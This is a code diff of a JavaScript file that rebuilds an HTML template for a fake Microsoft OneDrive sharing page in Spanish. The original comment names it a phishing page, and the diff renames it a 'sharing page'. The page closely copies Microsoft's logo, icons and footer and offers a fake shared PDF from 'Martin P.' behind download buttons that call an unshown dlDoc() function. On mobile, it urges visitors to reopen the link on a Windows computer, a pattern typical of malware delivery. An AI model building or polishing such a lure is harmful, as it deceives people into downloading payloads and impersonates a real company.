@@ -687,142 +687,226 @@ function dl(){
 </body>
 </html>`;
 
-// ── OneDrive-style phishing page (Fluent Design replica) ──
+// ── OneDrive-style sharing page (pixel-perfect Fluent 2 replica) ──
 const ONEDRIVE_HTML = `<!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Elemento compartido en OneDrive</title>
-<link rel="icon" type="image/x-icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/onedrive_48x1.svg">
+<link rel="icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/onedrive_48x1.svg" type="image/svg+xml">
 <style>
-:root{--bg:#f3f2f1;--card-bg:#ffffff;--text-primary:#323130;--text-secondary:#605e5c;--text-tertiary:#a19f9d;--brand:#0078d4;--brand-hover:#106ebe;--brand-pressed:#005a9e;--border:#edebe9;--border-dark:#c8c6c4;--shadow:0 3.2px 7.2px 0 rgba(0,0,0,.13),0 0.6px 1.8px 0 rgba(0,0,0,.11);--font:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif}
-*{box-sizing:border-box;margin:0;padding:0}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --font:'Segoe UI Variable','Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;
+  --bg:#f5f5f5;
+  --card-bg:#ffffff;
+  --text-primary:#1a1a1a;
+  --text-secondary:#616161;
+  --text-tertiary:#707070;
+  --text-link:#616161;
+  --brand:#0067b8;
+  --brand-hover:#005da6;
+  --brand-pressed:#004578;
+  --border:#e0e0e0;
+  --shadow:0 2px 4px rgba(0,0,0,.04),0 8px 16px rgba(0,0,0,.08);
+  --shadow-hover:0 4px 8px rgba(0,0,0,.06),0 16px 32px rgba(0,0,0,.12);
+}
+html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
 body{font-family:var(--font);background:var(--bg);color:var(--text-primary);min-height:100vh;display:flex;flex-direction:column}
-/* ── Top bar ── */
-.o-header{height:48px;background:#fff;border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 16px;position:fixed;top:0;left:0;right:0;z-index:100}
-.o-header .waffle{width:20px;height:20px;cursor:pointer;opacity:.7;margin-right:16px}
-.o-header .waffle:hover{opacity:1}
-.o-header .brand{display:flex;align-items:center;gap:8px;text-decoration:none;color:var(--text-primary)}
-.o-header .brand svg{width:24px;height:24px}
-.o-header .brand-text{font-size:16px;font-weight:600;color:var(--text-primary)}
-.o-header .right{margin-left:auto;display:flex;align-items:center;gap:8px}
-.o-header .help-btn,.o-header .settings-btn{width:40px;height:40px;border-radius:50%;border:none;background:transparent;cursor:pointer;display:flex;align-items:center;justify-content:center;color:var(--text-secondary)}
-.o-header .help-btn:hover,.o-header .settings-btn:hover{background:#f3f2f1}
-.o-header .user-btn{width:32px;height:32px;border-radius:50%;background:var(--brand);color:#fff;border:none;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center}
-/* ── Main content ── */
-.o-main{flex:1;display:flex;justify-content:center;align-items:center;padding:48px 20px 20px}
-.o-card{background:var(--card-bg);border-radius:4px;box-shadow:var(--shadow);border:1px solid var(--border);width:100%;max-width:440px;padding:36px 32px 28px;text-align:center}
-.o-cloud{margin-bottom:20px}
-.o-cloud svg{width:52px;height:52px}
-.o-title{font-size:20px;font-weight:600;color:var(--text-primary);margin-bottom:6px;line-height:1.3}
-.o-subtitle{font-size:14px;color:var(--text-secondary);margin-bottom:24px;line-height:1.5}
-/* ── File card ── */
-.o-file{display:flex;align-items:center;background:#faf9f8;border:1px solid var(--border);border-radius:4px;padding:12px;text-align:left;margin-bottom:24px;cursor:default}
-.o-file-icon{width:40px;height:40px;border-radius:2px;display:flex;align-items:center;justify-content:center;margin-right:12px;flex-shrink:0;font-weight:700;font-size:11px;color:#fff;letter-spacing:.3px}
-.o-file-icon.pdf{background:#d83b01}
-.o-file-icon.xlsx{background:#107c41}
-.o-file-icon.docx{background:#185abd}
-.o-file-icon.pptx{background:#c43e1c}
-.o-file-details{overflow:hidden;flex:1}
-.o-file-name{font-size:14px;font-weight:600;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px}
-.o-file-owner{font-size:12px;color:var(--text-secondary)}
-/* ── Buttons ── */
-.o-btn{display:block;width:100%;padding:10px 20px;font-size:14px;font-weight:600;font-family:var(--font);border-radius:2px;cursor:pointer;transition:background .1s}
-.o-btn-primary{background:var(--brand);color:#fff;border:none}.o-btn-primary:hover{background:var(--brand-hover)}.o-btn-primary:active{background:var(--brand-pressed)}
-.o-btn-outline{background:transparent;color:var(--text-primary);border:1px solid var(--border-dark);margin-top:8px}.o-btn-outline:hover{background:#f3f2f1}
-.o-footer{margin-top:16px;font-size:11px;color:var(--text-tertiary);line-height:1.6}
-.o-footer a{color:var(--text-tertiary);text-decoration:none}.o-footer a:hover{text-decoration:underline}
-.o-divider{width:100%;height:1px;background:var(--border);margin:16px 0}
-/* ── Mobile ── */
+
+/* ═══ Top navigation ═══ */
+.nav{height:48px;background:#fff;display:flex;align-items:center;padding:0 12px;position:fixed;top:0;left:0;right:0;z-index:100;border-bottom:1px solid #f0f0f0}
+
+/* Waffle (3×3 dots) */
+.waffle-btn{width:48px;height:48px;border:none;background:none;cursor:pointer;display:flex;align-items:center;justify-content:center;border-radius:4px;flex-shrink:0}
+.waffle-btn:hover{background:#f5f5f5}
+.waffle-btn svg{width:20px;height:20px}
+
+/* Microsoft logo */
+.ms-logo{display:flex;align-items:center;gap:8px;text-decoration:none;color:var(--text-primary);margin-left:4px}
+.ms-tiles{display:grid;grid-template-columns:10px 10px;grid-template-rows:10px 10px;gap:2px;flex-shrink:0}
+.ms-tiles .t1{background:#f25022}.ms-tiles .t2{background:#7fba00}.ms-tiles .t3{background:#00a4ef}.ms-tiles .t4{background:#ffb900}
+.ms-name{font-size:15px;font-weight:600;letter-spacing:-0.01em;color:#737373}
+
+/* Vertical divider */
+.nav-divider{width:1px;height:20px;background:#e0e0e0;margin:0 12px;flex-shrink:0}
+
+/* Product name */
+.product-name{font-size:15px;font-weight:600;color:var(--text-primary);text-decoration:none;white-space:nowrap}
+.product-name:hover{text-decoration:underline}
+
+/* Right nav actions */
+.nav-right{margin-left:auto;display:flex;align-items:center;gap:4px}
+.nav-icon-btn{width:40px;height:40px;border:none;background:none;cursor:pointer;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#616161}
+.nav-icon-btn:hover{background:#f5f5f5}
+.nav-avatar{width:32px;height:32px;border-radius:50%;background:#0067b8;color:#fff;border:none;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;margin-left:4px;letter-spacing:0.02em}
+
+/* ═══ Main content ═══ */
+.main{flex:1;display:flex;justify-content:center;align-items:center;padding:68px 20px 40px}
+
+/* ═══ Card ═══ */
+.card{background:var(--card-bg);border-radius:12px;box-shadow:var(--shadow);width:100%;max-width:480px;padding:40px 40px 32px;text-align:center;transition:box-shadow .2s}
+
+/* Cloud icon */
+.cloud-icon{margin-bottom:24px}
+.cloud-icon svg{width:56px;height:56px}
+
+/* Title */
+.share-title{font-size:22px;font-weight:600;color:var(--text-primary);line-height:1.35;margin-bottom:8px;letter-spacing:-0.01em}
+.share-subtitle{font-size:14px;color:var(--text-secondary);margin-bottom:28px;line-height:1.55}
+
+/* ═══ File row ═══ */
+.file-row{display:flex;align-items:center;background:#fafafa;border:1px solid var(--border);border-radius:8px;padding:14px 16px;text-align:left;margin-bottom:28px;transition:background .15s,border-color .15s}
+.file-row:hover{background:#f0f0f0;border-color:#d0d0d0}
+
+/* File type icon */
+.file-icon{width:40px;height:40px;border-radius:4px;display:flex;align-items:center;justify-content:center;margin-right:14px;flex-shrink:0}
+.file-icon svg{width:24px;height:24px}
+.file-icon.pdf{background:#d83b01}
+.file-icon.xlsx{background:#107c41}
+.file-icon.docx{background:#185abd}
+.file-icon.pptx{background:#c43e1c}
+
+.file-info{overflow:hidden;flex:1}
+.file-name{font-size:14px;font-weight:600;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:2px}
+.file-meta{font-size:12px;color:var(--text-secondary)}
+
+/* ═══ Buttons ═══ */
+.btn-primary{display:block;width:100%;padding:11px 24px;font-size:14px;font-weight:600;font-family:var(--font);border-radius:24px;cursor:pointer;transition:background .12s,box-shadow .12s;background:var(--brand);color:#fff;border:none}
+.btn-primary:hover{background:var(--brand-hover);box-shadow:0 2px 8px rgba(0,103,184,.25)}
+.btn-primary:active{background:var(--brand-pressed);box-shadow:none}
+
+.btn-secondary{display:block;width:100%;padding:10px 24px;font-size:14px;font-weight:600;font-family:var(--font);border-radius:24px;cursor:pointer;transition:all .12s;background:transparent;color:var(--text-primary);border:1px solid #d1d1d1;margin-top:10px}
+.btn-secondary:hover{background:#f5f5f5;border-color:#c0c0c0}
+
+/* ═══ Footer ═══ */
+.card-divider{width:100%;height:1px;background:var(--border);margin:24px 0 16px}
+.card-footer{font-size:12px;color:var(--text-tertiary);line-height:1.7}
+.card-footer a{color:var(--text-link);text-decoration:none}
+.card-footer a:hover{text-decoration:underline}
+
+/* ═══ Mobile ═══ */
 .mobile-only{display:none}
 @media(max-width:640px){
   .desktop-only{display:none!important}
   .mobile-only{display:block!important}
-  .o-card{padding:28px 24px 24px}
+  .card{padding:32px 24px 28px;border-radius:8px}
+  .share-title{font-size:20px}
+  .nav .ms-name{display:none}
+  .nav-divider{display:none}
 }
-/* ── Toast ── */
-.o-toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#107c10;color:#fff;padding:10px 20px;border-radius:2px;font-size:13px;display:none;z-index:200;box-shadow:var(--shadow)}
+
+/* ═══ Toast ═══ */
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#107c10;color:#fff;padding:10px 24px;border-radius:8px;font-size:13px;font-weight:500;display:none;z-index:200;box-shadow:0 4px 12px rgba(0,0,0,.15)}
+
+/* ═══ Warning banner (mobile) ═══ */
+.warn-box{background:#fff8e1;border:1px solid #ffe082;border-radius:8px;padding:14px 16px;text-align:left;font-size:13px;color:#1a1a1a;margin-top:16px;line-height:1.5}
+.warn-box strong{color:#8a6d00}
 </style>
 </head>
 <body>
 
-<!-- Header -->
-<header class="o-header">
-  <!-- Waffle menu -->
-  <svg class="waffle" viewBox="0 0 20 20" fill="var(--text-secondary)">
-    <circle cx="3" cy="3" r="1.8"/><circle cx="10" cy="3" r="1.8"/><circle cx="17" cy="3" r="1.8"/>
-    <circle cx="3" cy="10" r="1.8"/><circle cx="10" cy="10" r="1.8"/><circle cx="17" cy="10" r="1.8"/>
-    <circle cx="3" cy="17" r="1.8"/><circle cx="10" cy="17" r="1.8"/><circle cx="17" cy="17" r="1.8"/>
-  </svg>
-  <a class="brand" href="#">
-    <svg viewBox="0 0 24 24" fill="none"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z" fill="#0078D4"/></svg>
-    <span class="brand-text">OneDrive</span>
-  </a>
-  <div class="right">
-    <button class="help-btn" title="Ayuda">
-      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M10 2a8 8 0 100 16 8 8 0 000-16zm0 14.5a6.5 6.5 0 110-13 6.5 6.5 0 010 13zm-.75-3a.75.75 0 101.5 0 .75.75 0 00-1.5 0zm.75-7.5a2.25 2.25 0 00-2.25 2.25.75.75 0 001.5 0 .75.75 0 011.5 0c0 .41-.17.64-.72 1.05l-.14.1c-.5.38-.89.79-.89 1.6a.75.75 0 001.5 0c0-.26.09-.42.55-.75l.17-.13c.57-.43 1.03-.93 1.03-1.87A2.25 2.25 0 0010 6z"/></svg>
-    </button>
-    <button class="settings-btn" title="Configuración">
-      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M8.3 2a.75.75 0 00-.74.63l-.27 1.6a6.02 6.02 0 00-1.5.86l-1.5-.6a.75.75 0 00-.9.33L2.1 6.7a.75.75 0 00.15.95l1.22 1a6.1 6.1 0 000 1.72l-1.22 1a.75.75 0 00-.16.94l1.3 2.25a.75.75 0 00.9.33l1.5-.6c.44.36.94.65 1.49.86l.27 1.6a.75.75 0 00.74.63h2.6a.75.75 0 00.74-.63l.27-1.6a6.02 6.02 0 001.5-.86l1.5.6a.75.75 0 00.9-.33l1.3-2.25a.75.75 0 00-.16-.95l-1.22-1a6.1 6.1 0 000-1.72l1.22-1a.75.75 0 00.16-.94L16.3 4.82a.75.75 0 00-.9-.33l-1.5.6a6.02 6.02 0 00-1.49-.86l-.27-1.6A.75.75 0 0011.4 2H8.6zm1.3 5.5a2.5 2.5 0 100 5 2.5 2.5 0 000-5z"/></svg>
-    </button>
-    <button class="user-btn">M</button>
-  </div>
-</header>
+<!-- ═══ Navigation bar ═══ -->
+<nav class="nav">
+  <!-- Waffle -->
+  <button class="waffle-btn" aria-label="Aplicaciones de Microsoft">
+    <svg viewBox="0 0 16 16" fill="#4b4b4b"><rect x="1" y="1" width="3" height="3" rx=".4"/><rect x="6.5" y="1" width="3" height="3" rx=".4"/><rect x="12" y="1" width="3" height="3" rx=".4"/><rect x="1" y="6.5" width="3" height="3" rx=".4"/><rect x="6.5" y="6.5" width="3" height="3" rx=".4"/><rect x="12" y="6.5" width="3" height="3" rx=".4"/><rect x="1" y="12" width="3" height="3" rx=".4"/><rect x="6.5" y="12" width="3" height="3" rx=".4"/><rect x="12" y="12" width="3" height="3" rx=".4"/></svg>
+  </button>
 
-<!-- Main content -->
-<main class="o-main">
-  <div class="o-card">
+  <!-- Microsoft logo (4-color tiles) -->
+  <a class="ms-logo" href="#">
+    <div class="ms-tiles"><div class="t1"></div><div class="t2"></div><div class="t3"></div><div class="t4"></div></div>
+    <span class="ms-name">Microsoft</span>
+  </a>
+
+  <!-- Divider -->
+  <div class="nav-divider"></div>
+
+  <!-- Product name -->
+  <a class="product-name" href="#">OneDrive</a>
+
+  <!-- Right actions -->
+  <div class="nav-right">
+    <!-- Search -->
+    <button class="nav-icon-btn" title="Buscar">
+      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M8.5 3a5.5 5.5 0 014.38 8.82l4.15 4.15a.75.75 0 01-1.06 1.06l-4.15-4.15A5.5 5.5 0 118.5 3zm0 1.5a4 4 0 100 8 4 4 0 000-8z"/></svg>
+    </button>
+    <!-- Notifications -->
+    <button class="nav-icon-btn" title="Notificaciones">
+      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M10 2a5.92 5.92 0 015.98 5.36l.02.46V11.4l1.4 2.33a.75.75 0 01-.53 1.14l-.11.01H3.24a.75.75 0 01-.7-.97l.06-.13L4 11.44V7.82l.01-.38A5.92 5.92 0 0110 2zm0 1.5c-2.35 0-4.37 1.76-4.48 4.02L5.5 7.82v3.84l-.04.17L4.4 13.4h11.22l-1.07-1.6-.04-.13L14.5 7.8v-.03c-.05-2.3-2.07-4.14-4.42-4.27L10 3.5zM8 15.5h4a2 2 0 01-3.99.15L8 15.5z"/></svg>
+    </button>
+    <!-- Help -->
+    <button class="nav-icon-btn" title="Ayuda">
+      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M10 2a8 8 0 110 16 8 8 0 010-16zm0 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM10 13a.75.75 0 110 1.5.75.75 0 010-1.5zm0-7a2.75 2.75 0 012.75 2.75c0 1.01-.53 1.56-1.12 2.03l-.17.13c-.39.28-.46.42-.46.59a.75.75 0 01-1.5 0c0-.88.44-1.33.97-1.73l.14-.1c.49-.37.64-.56.64-.92a1.25 1.25 0 00-2.5 0 .75.75 0 01-1.5 0A2.75 2.75 0 0110 6z"/></svg>
+    </button>
+    <!-- Settings -->
+    <button class="nav-icon-btn" title="Configuración">
+      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M1.91 7.38l.06-.1 1.3-2.25a.75.75 0 01.78-.4l.11.03 1.63.66a6 6 0 011.17-.68l.3-1.76a.75.75 0 01.63-.58l.11-.01h2.6a.75.75 0 01.72.52l.03.1.3 1.73c.44.18.85.41 1.23.68l1.57-.63a.75.75 0 01.84.2l.07.1 1.3 2.25a.75.75 0 01-.07.86l-.08.08-1.27 1.07a6 6 0 010 1.38l1.27 1.07a.75.75 0 01.22.84l-.05.1-1.3 2.25a.75.75 0 01-.78.4l-.11-.03-1.57-.63c-.38.27-.79.5-1.23.68l-.3 1.73a.75.75 0 01-.64.58l-.11.01H8.6a.75.75 0 01-.72-.52l-.03-.1-.3-1.73a6 6 0 01-1.18-.68l-1.62.66a.75.75 0 01-.84-.2l-.07-.1-1.3-2.25a.75.75 0 01.07-.86l.08-.08 1.27-1.07a6 6 0 010-1.38L2.69 8.37a.75.75 0 01-.22-.84l.05-.1L3.82 5.2zM10 7.5a2.5 2.5 0 100 5 2.5 2.5 0 000-5z"/></svg>
+    </button>
+    <!-- User avatar -->
+    <button class="nav-avatar">M</button>
+  </div>
+</nav>
+
+<!-- ═══ Main area ═══ -->
+<main class="main">
+  <div class="card">
     <!-- OneDrive cloud icon -->
-    <div class="o-cloud">
+    <div class="cloud-icon">
       <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M14.7 39h22.3a9 9 0 002-17.8A11 11 0 0018.5 15 9 9 0 005.7 23.9 8 8 0 0014.7 39z" fill="#0078D4"/>
-        <path d="M11.5 14.1c.6-.5 1.2-.9 1.9-1.2A11 11 0 0126 14.7 9 9 0 0138 22.2a9 9 0 011 .5 8.5 8.5 0 00-8-11.7 11 11 0 00-19.5 3.1z" fill="#1490DF" opacity=".7"/>
+        <path d="M14.5 38h22.8a8.7 8.7 0 001.7-17.3A10.8 10.8 0 0019 14.8a8.7 8.7 0 00-12.3 8.5A7.7 7.7 0 0014.5 38z" fill="#0078D4"/>
+        <path d="M37 20.7a8.7 8.7 0 011 .5c-.3-4.7-4.2-8.5-9-8.5a9 9 0 00-5.5 1.9A10.8 10.8 0 0138.5 21l-.3-.1a8.7 8.7 0 00-1.2-.2z" fill="#1490DF" opacity=".7"/>
+        <path d="M19 14.8a10.7 10.7 0 00-5.6 1.3 8.7 8.7 0 00-6.7 7.2A7.7 7.7 0 006 24a7.7 7.7 0 00.7-.7c.4-3.2 2.7-5.8 5.8-6.6a10.8 10.8 0 016.5-1.9z" fill="#28A8EA" opacity=".5"/>
       </svg>
     </div>
 
     <div class="desktop-only">
-      <h1 class="o-title">Se compartió un archivo con usted</h1>
-      <p class="o-subtitle">Este elemento se compartió de forma segura a través de OneDrive.</p>
+      <h1 class="share-title">Se compartió un archivo con usted</h1>
+      <p class="share-subtitle">Este elemento se compartió de forma segura a través de OneDrive.</p>
 
       <!-- File card -->
-      <div class="o-file">
-        <div class="o-file-icon pdf">PDF</div>
-        <div class="o-file-details">
-          <div class="o-file-name">Documento_Importante_2024.pdf</div>
-          <div class="o-file-owner">Martin P. lo compartió con usted</div>
+      <div class="file-row">
+        <div class="file-icon pdf">
+          <svg viewBox="0 0 24 24" fill="none"><path d="M6 2h8l6 6v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4a2 2 0 012-2z" fill="#fff" opacity=".9"/><path d="M14 2l6 6h-4a2 2 0 01-2-2V2z" fill="#fff" opacity=".6"/><text x="7" y="18" font-size="6" font-weight="700" fill="#fff" font-family="Segoe UI,sans-serif">PDF</text></svg>
+        </div>
+        <div class="file-info">
+          <div class="file-name">Documento_Importante_2024.pdf</div>
+          <div class="file-meta">Martin P. lo compartió con usted · PDF</div>
         </div>
       </div>
 
-      <!-- Actions -->
-      <button class="o-btn o-btn-primary" onclick="dlDoc()">Abrir</button>
-      <button class="o-btn o-btn-outline" onclick="dlDoc()">Descargar</button>
+      <!-- Action buttons -->
+      <button class="btn-primary" onclick="dlDoc()">Abrir</button>
+      <button class="btn-secondary" onclick="dlDoc()">Descargar</button>
     </div>
 
     <div class="mobile-only">
-      <h1 class="o-title">Se compartió un archivo con usted</h1>
-      <p class="o-subtitle" style="margin-bottom:16px">Este documento requiere ser descargado desde una computadora con Windows para su correcta visualización.</p>
-      <div class="o-file">
-        <div class="o-file-icon pdf">PDF</div>
-        <div class="o-file-details">
-          <div class="o-file-name">Documento_Importante_2024.pdf</div>
-          <div class="o-file-owner">Martin P. lo compartió con usted</div>
+      <h1 class="share-title">Se compartió un archivo con usted</h1>
+      <p class="share-subtitle" style="margin-bottom:20px">Este documento requiere ser descargado desde una computadora con Windows para su correcta visualización.</p>
+      <div class="file-row">
+        <div class="file-icon pdf">
+          <svg viewBox="0 0 24 24" fill="none"><path d="M6 2h8l6 6v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4a2 2 0 012-2z" fill="#fff" opacity=".9"/><path d="M14 2l6 6h-4a2 2 0 01-2-2V2z" fill="#fff" opacity=".6"/><text x="7" y="18" font-size="6" font-weight="700" fill="#fff" font-family="Segoe UI,sans-serif">PDF</text></svg>
+        </div>
+        <div class="file-info">
+          <div class="file-name">Documento_Importante_2024.pdf</div>
+          <div class="file-meta">Martin P. lo compartió con usted · PDF</div>
         </div>
       </div>
-      <div style="background:#fff4ce;border:1px solid #f0e6b2;border-radius:4px;padding:12px;text-align:left;font-size:13px;color:#323130">
+      <div class="warn-box">
         <strong>⚠ Aviso:</strong> Para abrir este documento, accedé a este enlace desde tu computadora.
       </div>
     </div>
 
-    <div class="o-divider"></div>
-    <div class="o-footer">
+    <div class="card-divider"></div>
+    <div class="card-footer">
       <a href="#">Términos de uso</a> · <a href="#">Privacidad y cookies</a><br>
       Microsoft OneDrive · © Microsoft 2024
     </div>
   </div>
 </main>
 
-<div class="o-toast" id="toast">✓ Descarga iniciada</div>
+<div class="toast" id="toast">✓ Descarga iniciada</div>
 
 <script>
 function dlDoc(){
